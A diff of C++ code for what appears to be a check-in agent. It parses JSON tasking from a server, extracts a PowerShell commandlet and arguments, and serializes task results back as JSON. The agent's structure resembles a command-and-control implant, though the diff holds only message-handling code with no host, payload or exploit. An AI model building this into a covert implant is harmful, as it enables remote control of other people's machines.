@@ -68,6 +68,32 @@ struct FullCheckinRequest
 	std::string output;
 };
 
+struct ResultRequest
+{
+	int taskID;
+	std::string status;
+	std::string output;
+
+	std::string StructToJson() const
+	{
+		rapidjson::Document doc;
+		doc.SetObject();
+
+		rapidjson::Document::AllocatorType& allocator = doc.GetAllocator();
+
+		
+		doc.AddMember("taskID", taskID, allocator);
+		doc.AddMember("status", rapidjson::Value(status.c_str(), allocator), allocator);
+		doc.AddMember("output", rapidjson::Value(output.c_str(), allocator), allocator);
+
+		rapidjson::StringBuffer buffer;
+		rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
+		doc.Accept(writer);
+		return buffer.GetString();
+
+	}
+};
+
 struct PowershellCommand
 {
 	std::string commandlet;
@@ -78,7 +104,7 @@ struct PowershellCommand
 struct CheckinResponse
 {
 	int id;
-	std::string type;
+	int type;
 	std::string timestamp;
 	PowershellCommand powerShellCommand;
 };
@@ -95,9 +121,9 @@ CheckinResponse ParseCommand(const std::string& rawJson)
 		return response;
 	}
 
-	if (doc.HasMember("commandType") && doc["commandType"].IsString())
+	if (doc.HasMember("commandType") && doc["commandType"].IsInt())
 	{
-		response.type = doc["commandType"].GetString();
+		response.type = doc["commandType"].GetInt();
 	}
 	else
 	{
@@ -105,16 +131,16 @@ CheckinResponse ParseCommand(const std::string& rawJson)
 		return response;
 	}
 
-	if (doc.HasMember("taskID") && doc["taskID"].IsInt()) response.id = doc["taskID"].GetInt();
+	if (doc.HasMember("ID") && doc["ID"].IsInt()) response.id = doc["ID"].GetInt();
 	if (doc.HasMember("timestamp") && doc["timestamp"].IsString()) response.timestamp = doc["timestamp"].GetString();
 
 	if (doc.HasMember("command") && doc["command"].IsObject())
 	{
 		const rapidjson::Value& node = doc["command"];
 
-		switch (string_hash(response.type))
+		switch (response.type)
 		{
-		case string_hash("PowerShell"):
+		case 1:
 			if (node.HasMember("Commandlet") && node["Commandlet"].IsString()) response.powerShellCommand.commandlet = node["Commandlet"].GetString();
 			if (node.HasMember("Arguements") && node["Arguements"].IsString()) response.powerShellCommand.arguements = node["Arguements"].GetString();
 			break;
